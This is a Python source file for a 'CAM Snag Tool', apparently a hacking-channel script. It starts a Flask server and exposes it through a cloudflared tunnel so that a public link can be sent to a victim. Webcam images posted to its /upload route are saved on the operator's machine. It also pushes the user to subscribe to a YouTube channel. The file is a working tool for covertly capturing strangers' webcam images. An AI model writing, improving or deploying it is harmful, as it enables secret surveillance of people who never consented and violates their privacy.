import os
import threading
import subprocess
import time
from flask import Flask, render_template, request

# ──────[ FLASK SETUP ]──────
app = Flask(__name__, template_folder="templates", static_folder="static")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    image = request.files['webcam']
    image.save('captured_image.jpg')
    print("\n[•] Image captured and saved as captured_image.jpg")
    return 'Image received'

# ──────[ START FLASK + CLOUDFLARED ]──────
def start_flask_server():
    # Start cloudflared tunnel in background
    threading.Thread(
        target=lambda: os.system("cloudflared tunnel --url http://localhost:5000 > /dev/null 2>&1"),
        daemon=True
    ).start()

    # Start Flask server
    from werkzeug.serving import run_simple
    run_simple('0.0.0.0', 5000, app)

# ──────[ BANNER ]──────
os.system("clear")
print("\033[1;31m╔" + "═" * 50 + "╗")
print("║{:^50}║".format("\033[1mHCO - CAM Snag Tool\033[0;31m"))
print("║{:^50}║".format("\033[32mby Azhar\033[0;31m"))
print("╚" + "═" * 50 + "╝\033[0m")
print("[•] This tool is not free. Redirecting to YouTube...")
print("[•] Press ENTER after subscribing to continue...\n")

# ──────[ REDIRECT TO YOUTUBE ]──────
os.system("xdg-open 'https://youtube.com/@hackers_colony_tech?si=pvdCWZggTIuGb0ya'")
input()

# ──────[ START SERVER + TUNNEL ]──────
threading.Thread(target=start_flask_server, daemon=True).start()

# ──────[ STATUS MESSAGES ]──────
print("\n[•] Flask server started at http://127.0.0.1:5000")
print("[•] Waiting for webcam capture...")

# ──────[ SHOW CLOUDFLARE LINK ]──────
time.sleep(5)  # Wait a few seconds for cloudflared to initialize
try:
    output = subprocess.check_output("curl -s http://127.0.0.1:4040/api/tunnels", shell=True).decode()
    public_url = output.split('"public_url":"')[1].split('"')[0]
    print(f"[•] Cloudflare URL: {public_url}")
except:
    print("[!] Failed to fetch Cloudflare URL. Is cloudflared running?")
